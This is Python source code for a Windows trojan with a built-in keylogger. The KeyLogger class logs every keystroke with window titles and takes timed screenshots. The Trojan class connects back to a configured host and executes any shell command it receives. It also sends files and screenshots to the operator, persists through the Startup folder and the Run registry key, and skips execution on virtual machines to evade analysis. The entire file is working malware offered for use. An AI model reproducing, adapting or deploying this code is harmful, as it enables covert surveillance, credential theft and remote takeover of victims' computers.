import socket
import time
import subprocess
import threading
import os
import sys
import winreg as reg
import ctypes as c

from pynput import keyboard as kb
from win32gui import GetWindowText, GetForegroundWindow
import pyautogui as pg
from PIL import ImageGrab as Ig
from datetime import datetime


class KeyLogger:
    def __init__(self, auto_screenshot=False, time_screenshot=5):
        try:
            wd = os.path.join(os.fspath(subprocess.check_output("echo %APPDATA%", shell=True).decode().replace('\r\n', '')), 'KeyBoard')
        except Exception as e:
            print(e)
            wd = os.getcwd()
        self.last_window = None
        self.auto_screenshot = auto_screenshot
        self.time_screenshot = time_screenshot
        self.screenshot_thread = threading.Thread(target=self.exec_auto_screenshot, daemon=True)
        self.working_dir = wd

        self.generate_workdir()

        if self.auto_screenshot:
            self.screenshot_thread.start()

        self.listener = threading.Thread(target=self.listen, daemon=True)
        self.listener.start()

    def listen(self):
        with kb.Listener(on_press=lambda key: self.press(key)) as listner:
            listner.join()

    def generate_workdir(self):
        try:
            os.mkdir(self.working_dir)
        except FileExistsError:
            pass
        except Exception as e:
            print(e)
            return False

        try:
            os.mkdir(os.path.join(self.working_dir, 'prints'))
        except FileExistsError:
            pass
        except Exception as e:
            print(e)
            return False

        return True

    def press(self, key):
        window = GetWindowText(GetForegroundWindow())
        if window != self.last_window:
            self.last_window = window
            with open(os.path.join(self.working_dir, 'keyboard.log'), 'a') as f:
                f.write(f"\n #### {window} - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} #### \n")

        if hasattr(key, 'char'):
            if int(key.vk) in [96, 97, 98, 99, 100, 101, 102, 103, 104, 105]:
                value = str(int(key.vk) - 96)
            else:
                value = key.char
        elif hasattr(key, 'name'):
            if key.name == 'enter':
                value = f' [{key.name}] \n'
            else:
                value = f' [{key.name}] '
        else:
            value = str(key)

        with open(os.path.join(self.working_dir, 'keyboard.log'), 'a') as f:
            if value:
                f.write(value)

    def exec_auto_screenshot(self):
        if self.time_screenshot < 5:
            self.time_screenshot = 5

        while self.auto_screenshot:
            time.sleep(self.time_screenshot)
            filename = f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
            path = os.path.join(self.working_dir, 'prints')
            screen = Ig.grab(all_screens=True)
            screen.save(os.path.join(path, filename))

    def screenshot(self, filename):
        path = os.path.join(self.working_dir, 'prints')
        screen = Ig.grab(all_screens=True)
        screen.save(os.path.join(path, filename))


class Trojan:
    try:
        import config.compiler_config as comp

        HOST = comp.HOST
        PORT = comp.PORT
        ACTIVATE = comp.ACTIVATE
        PERSIST = comp.PERSIST
        ADMIN = comp.ADMIN
        DETECT_VM = comp.DETECT_VM
        AUTO_SCREENSHOT = comp.AUTO_SCREENSHOT
        TIME_SCREENSHOT = comp.TIME_SCREENSHOT
    except (ImportError, AttributeError) as e:
        print(e)
        HOST = "127.0.0.1"
        PORT = 469
        ACTIVATE = True
        PERSIST = False
        ADMIN = False
        DETECT_VM = False
        AUTO_SCREENSHOT = False
        TIME_SCREENSHOT = 5
        # c.windll.user32.MessageBoxW(0, str(e), "err")

    def __init__(
            self,
            host=HOST,
            port=PORT,
            activate=ACTIVATE,
            persist=PERSIST,
            admin=ADMIN,
            try_detect_vm=DETECT_VM,
            auto_screenshot=AUTO_SCREENSHOT,
            time_screenshot=TIME_SCREENSHOT
    ):
        self.client = None
        self.is_vm = False
        self.host = host
        self.port = port
        self.activate = activate
        self.persist = persist
        self.admin = admin
        self.try_detect_vm = try_detect_vm
        self.filename = os.path.basename(sys.argv[0])

        self.keylogger = KeyLogger(auto_screenshot, time_screenshot)

        if self.try_detect_vm:
            self.detect_vm()

    def autorun(self):
        try:
            os.system(f"copy {self.filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")
        except Exception as e:
            print(e)

        if self.admin:
            try:
                path = os.path.dirname(os.path.realpath(self.filename))
                name = self.filename
                address = os.path.join(path, name)

                key = reg.HKEY_CURRENT_USER
                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as register:
                    reg.SetValue(register, "Any", reg.REG_SZ, address)
                    register.Close()

            except (PermissionError, WindowsError, OSError):
                print("Permission denied")

    def detect_vm(self):
        self.is_vm = False
        if self.try_detect_vm:
            vm_vendors = ["VMware", "VirtualBox", "Virtual", "Microsoft Corporation", "Hyper-V", "QEMU", "KVM"]
            output = subprocess.check_output("wmic baseboard get product", shell=True).decode().lower()
            print(output)

            for vendor in vm_vendors:
                if vendor.lower() in output:
                    self.is_vm = True

    def connect(self):
        # try:
        #     ip = socket.gethostbyname(host)
        # except Exception as e:
        #     ip = socket.gethostbyaddr(host)
        #     print(e)
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.host, self.port))
            self.client = client
        except Exception as error:
            print("error connect", error)
            self.client = None

    def listen(self):
        try:
            while True:
                data = self.client.recv(1024).decode().strip()
                if not data:
                    break
                elif data == "/exit":
                    self.client.close()
                    sys.exit()
                elif data == "/print":
                    t = threading.Thread(target=self.print, daemon=True)
                    t.start()
                    t.join()
                elif data.startswith("/get "):
                    data = data.rsplit(" ", 1)
                    if len(data) == 2:
                        t = threading.Thread(target=self.send_file, args=(data[1],), daemon=True)
                        t.start()
                        t.join()
                else:
                    t = threading.Thread(target=self.cmd, args=(data,), daemon=True)
                    t.start()
                    t.join()
        except Exception as error:
            print("Error listen", error)
            if self.client:
                self.client.close()

    def send_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
        except FileNotFoundError:
            file_data = b''

        try:
            self.client.send(f"{len(file_data)}".encode())
            if not file_data:
                self.client.send("File Not Found".encode())
            else:
                self.client.send(file_data)
        except Exception as error:
            print("Error file", error)

    def print(self):
        filename = f"exec_screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
        self.keylogger.screenshot(filename)
        try:
            prints_path = os.path.join(self.keylogger.working_dir, 'prints')
            self.client.send(f"{os.path.join(prints_path, filename)}\n".encode())
        except Exception as error:
            print("Error print", error)

    def cmd(self, data):
        try:
            # noinspection SubprocessShellMode
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            if output != b'':
                self.client.send(output)
        except Exception as error:
            print("error cmd", error)

    def run(self):
        if not self.is_vm:
            if self.persist:
                self.autorun()
            time.sleep(2)

            while self.activate:
                self.connect()
                if self.client:
                    self.listen()
                else:
                    time.sleep(3)


if __name__ == "__main__":
    trojan = Trojan()
    c.windll.user32.MessageBoxW(0, f"HOST: {trojan.HOST}, PORT: {trojan.PORT}, ACTIVATE: {trojan.ACTIVATE}, PERSIST: {trojan.PERSIST}, ADMIN: {trojan.ADMIN}, DETECT_VM: {trojan.DETECT_VM}, is_vm: {trojan.is_vm}", "types")
    trojan.run()
